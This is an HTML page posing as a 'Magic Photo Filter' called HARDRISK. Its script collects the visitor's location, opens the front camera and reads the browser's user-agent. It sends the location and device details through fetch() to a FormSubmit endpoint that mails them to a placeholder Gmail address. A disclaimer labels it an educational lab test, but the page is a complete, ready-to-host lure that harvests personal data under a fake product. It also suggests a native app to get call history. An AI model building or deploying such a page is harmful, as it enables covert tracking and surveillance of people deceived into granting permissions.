<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HARDRISK: Magic Photo Filter</title>
    <style>
        body {
            background: linear-gradient(to right, #ff6b6b, #4ecdc4);
            font-family: Arial, sans-serif;
            text-align: center;
            color: white;
            margin: 0;
            padding: 20px;
        }
        h1 {
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        p {
            font-size: 1.2em;
        }
        .btn {
            padding: 15px 30px;
            font-size: 1.5em;
            background: #ffd700;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: scale(1.1);
        }
        #preview {
            margin: 20px auto;
            max-width: 300px;
            border-radius: 10px;
        }
        #dataOutput {
            margin-top: 20px;
            background: rgba(0,0,0,0.5);
            padding: 10px;
            border-radius: 10px;
        }
        .disclaimer {
            font-size: 0.9em;
            margin-top: 20px;
            color: #ffd700;
        }
    </style>
</head>
<body>
    <h1>HARDRISK: Magic Photo Filter</h1>
    <p>Try our mind-blowing filter! Allow permissions to unlock the magic (Lab Test Only).</p>
    <img id="preview" src="https://via.placeholder.com/300x200?text=Magic+Filter+Preview" alt="Filter Preview">
    <button class="btn" onclick="startMagic()">Unlock Magic Filter</button>
    <div id="dataOutput"></div>
    <p class="disclaimer">This is an educational cybersecurity test. By proceeding, you consent to sharing location, camera, and device data for lab purposes only. Use fake data.</p>

    <script>
        function startMagic() {
            let output = document.getElementById('dataOutput');
            output.innerHTML = "Collecting data... (Lab Test)<br>";

            // Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    output.innerHTML += `Location: ${pos.coords.latitude}, ${pos.coords.longitude}<br>`;
                    sendData(`Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
                }, err => {
                    output.innerHTML += "Location access denied.<br>";
                });
            }

            // Camera (Photos/Videos/Live)
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then(stream => {
                        output.innerHTML += "Camera accessed! Ready for live photos.<br>";
                        let video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        document.body.appendChild(video);
                        sendData("Camera accessed");
                    })
                    .catch(err => {
                        output.innerHTML += "Camera access denied.<br>";
                    });
            }

            // Device Info
            let deviceInfo = `Device: ${navigator.userAgent}<br>`;
            output.innerHTML += deviceInfo;
            sendData(deviceInfo);

            // Note: Call History not accessible via web
            output.innerHTML += "Call history not available via web. Try native app for full access.<br>";
        }

        // Send data to email (FormSubmit)
        function sendData(data) {
            fetch('https://formsubmit.co/ajax/your-email@gmail.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    _subject: 'HARDRISK Data',
                    data: data
                })
            })
            .then(response => response.json())
            .then(data => console.log('Data sent:', data))
            .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html>
